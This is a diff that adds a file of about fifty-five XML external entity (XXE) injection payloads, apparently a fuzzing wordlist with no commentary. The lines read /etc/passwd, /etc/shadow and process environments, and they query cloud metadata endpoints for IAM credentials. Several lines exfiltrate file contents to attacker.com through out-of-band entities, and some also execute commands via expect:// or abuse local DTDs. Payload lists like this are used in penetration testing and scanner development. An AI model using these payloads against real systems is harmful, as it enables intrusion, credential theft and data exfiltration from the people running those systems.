@@ -1,0 +1,55 @@
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/urandom">]><foo>&xxe;</foo>
+<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>
+<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>
+<!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>
+<!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/version">]><data>&file;</data>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfil;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/group">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/issue">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/motd">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/hostname">]><test>&xxe;</test>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/project-id">]><test>&xxe;</test>
+<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY bar "World"> ]><foo>Hello &bar;</foo>
+<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY bar SYSTEM "file:///etc/passwd"> ]><foo>&bar;</foo>
+<!DOCTYPE foo [ <!ENTITY bar SYSTEM "file:///etc/passwd"> ]><foo>&bar;</foo>
+<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "file:///etc/passwd">]><r>&sp;</r>
+<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "file:///c:/windows/win.ini">]><r>&sp;</r>
+<!DOCTYPE replace [<!ENTITY xxe "test"> ]><replace>&xxe;</replace>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><replace>&xxe;</replace>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY callhome SYSTEM "http://attacker.com/?%xxe;">]><foo>&callhome;</foo>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.xml"> %xxe;]><foo>&send;</foo>
+<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfiltrate;
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfiltrate;
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root>&send;</root>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%init;%trick;]><root></root>
+<!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><svg>&xxe;</svg>
+<!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><svg>&xxe;</svg>
+<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><html>&xxe;</html>
+<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><html>&xxe;</html>
+<!DOCTYPE users [<!ELEMENT users ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><users>&xxe;</users>
+<!DOCTYPE users [<!ELEMENT users ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><users>&xxe;</users>
+<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"><!ENTITY % expr 'aaa)><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY yyy (bbb'>%local_dtd;]><root>&xxe;</root>
+<!DOCTYPE message [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso '<!ENTITY xxe SYSTEM "file:///etc/passwd">'>%local_dtd;]><message>&xxe;</message>
